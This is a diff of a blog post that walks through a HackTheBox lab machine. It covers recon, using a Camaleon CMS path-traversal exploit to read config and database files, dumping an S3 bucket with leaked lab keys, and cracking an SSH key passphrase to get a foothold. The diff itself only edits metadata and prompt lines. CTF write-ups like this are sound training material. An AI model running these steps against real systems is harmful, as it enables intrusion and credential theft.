@@ -1,6 +1,7 @@
 +++
 title = "Facts - Vulnerable CMS leads to root access"
 date = 2026-05-11T11:22:35Z
+difficulty = "easy"
 tags = ["HTB - Easy", "Linux", "Pentesting"]
 description = "Pwning the Facts machine from HTB."
 +++
@@ -9,7 +10,7 @@ description = "Pwning the Facts machine from HTB."
 ## **RECON**
 After obtaining the target machine's IP address, I ran an nmap scan to identify open TCP ports:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# nmap -sC -sV -oN nmap_tcp.txt 10.129.53.63 --min-rate=10000
 ```
 The scan revealed two open TCP ports for SSH and HTTP (UDP scans did not show any open ports):
@@ -36,7 +37,7 @@ Trying to navigate to **http://10.129.53.63:80/** redirected me to **http://fact
 The website was a collection of fun facts, and I noticed there were no obvious endpoints such as a "sign in" button or "about" page. To get a better scope of the web app, I ran a gobuster directory scan to find directories.
 ## **ENUMERATION**
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# gobuster dir -u "http://facts.htb" -w ../SecLists/Discovery/Web-Content/common.txt -t 25 --timeout 20s
 ```
 The only endpoint that didn't appear to be a redirect was **"/admin"**. Visiting http://facts.htb/admin took me to this page:
@@ -158,7 +159,7 @@ wget https://www.exploit-db.com/raw/52531 && mv 52531 exploit.py
 ```
 I then executed the script by specifying the target URL, file path to request, and auth_token value:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# python3 exploit.py                         
 
 Camaleon CMS v2.9.0 - Path Traversal PoC (authorized testing only)
@@ -215,7 +216,7 @@ After doing some more digging online, I found out that Camaleon CMS is Ruby on R
 &nbsp;  
 I knew that **/proc/self/cwd** was a very common path for web applications to be running from, and so I was able to read the **database.yml** file by running the exploit script and searching for **/proc/self/cwd/config/database.yml**.  
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# python3 exploit.py                         
 
 Camaleon CMS v2.9.0 - Path Traversal PoC (authorized testing only)
@@ -299,7 +300,7 @@ if response.status_code == 200:
 ```
 I then ran the exploit and was able to obtain a dump of **production.sqlite3**. This was a big step toward getting a foothold on the system, and the tables were very promising:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# sqlite3 dump.sqlite3 
 SQLite version 3.46.1 2024-08-13 09:16:08
 Enter ".help" for usage hints.
@@ -336,7 +337,7 @@ With this information, I connected to the AWS bucket on my attacker machine:
 &nbsp;  
 Setting up the configuration:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# aws configure                                  
 AWS Access Key ID: AKIA0BFCF1A5C7112990
 AWS Secret Access Key: ei0GZaLK24JLkHyLJHMKRs3WsazqkDqUt+z0Jj+i
@@ -345,45 +346,45 @@ Default output format [None]:
 ```
 Listing the buckets:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# aws --endpoint-url http://facts.htb:54321 s3 ls --recursive
 2025-09-11 05:06:52 internal
 2025-09-11 05:06:52 randomfacts
 ```
 The bucket I was really interested in was *internal*, so I dumped it:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/ ./internal_dump --recursive
 ```
 I looked through the dump and found a **.ssh** folder, which brought me one step closer to getting a foothold on the target machine:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# cd internal_dump 
                                                            
-┌──(root㉿kali)-[/home/esteban/HackTheBox/internal_dump]
+┌──(root㉿pangelinan)-[~/HackTheBox/internal_dump]
 └─# ls -a
 .   .bash_logout  .bundle  .lesshst  .ssh
 ..  .bashrc       .cache   .profile
 
-┌──(root㉿kali)-[/home/esteban/HackTheBox/internal_dump]
+┌──(root㉿pangelinan)-[~/HackTheBox/internal_dump]
 └─# cd .ssh         
                                                              
-┌──(root㉿kali)-[/home/esteban/HackTheBox/internal_dump/.ssh]
+┌──(root㉿pangelinan)-[~/HackTheBox/internal_dump/.ssh]
 └─# ls   
 authorized_keys  id_ed25519
 ```
 I cloned the **id_ed25519** SSH key, gave it permissions, and tested it out with the users **trivia** and **william**. The key ended up working for **trivia**, but required a passphrase.
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh -i cloned_key trivia@facts.htb          
 Enter passphrase for key 'cloned_key': 
 ```
 I had to crack the passkey by using **ssh2john** to create a hash, then passing it to **john the ripper**:
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh2john cloned_key > cloned_key_hash.txt
                                                              
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# john cloned_key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
@@ -400,7 +401,7 @@ Found the passphrase- **dragonballz**.
 ## **FOOTHOLD**
 With the passphrase successfully cracked, I was able to SSH into the target machine as the user, **trivia**.
 ```bash
-┌──(root㉿kali)-[/home/esteban/HackTheBox]
+┌──(root㉿pangelinan)-[~/HackTheBox]
 └─# ssh -i cloned_key trivia@facts.htb
 Enter passphrase for key 'cloned_key': 
 Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh
